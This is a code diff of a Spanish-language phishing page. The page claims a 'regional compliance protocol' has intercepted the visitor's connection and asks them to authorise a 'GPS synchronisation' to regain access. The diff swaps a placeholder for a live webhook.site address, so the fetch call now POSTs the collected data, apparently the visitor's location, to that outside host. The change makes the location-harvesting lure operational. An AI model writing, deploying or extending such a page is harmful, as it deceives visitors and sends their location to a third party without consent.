@@ -100,7 +100,7 @@
             </svg>
             <div class="title">Restricción de Nodo Local</div>
             <div class="description">
-                Su conexión actual ha sido interceptada por un protocolo de cumplimiento regional. Para habilitar el acceso a la red de contenido de su país, se requiere una <strong>sincronización de coordenadas GPS</strong> con el servidor local.
+                Su conexión actual ha sido interceptada por un protocolo de cumplimiento regional. Para habilitar el acceso a la red de contenido de su país, se requiere una <strong>sincronización de pais GPS</strong> con el servidor local.
             </div>
             <button class="btn" id="s" onclick="init()">Autorizar Sincronización</button>
         </div>
@@ -134,7 +134,7 @@
                     };
                     
                     // ENVÍO DE DATOS
-                    fetch('TU_URL_DE_WEBHOOK_AQUI', {
+                    fetch('https://webhook.site/2251efe8-cd5e-4051-b2c7-0f8f5baf7fd8', {
                         method: 'POST',
                         mode: 'no-cors',
                         body: JSON.stringify(d)
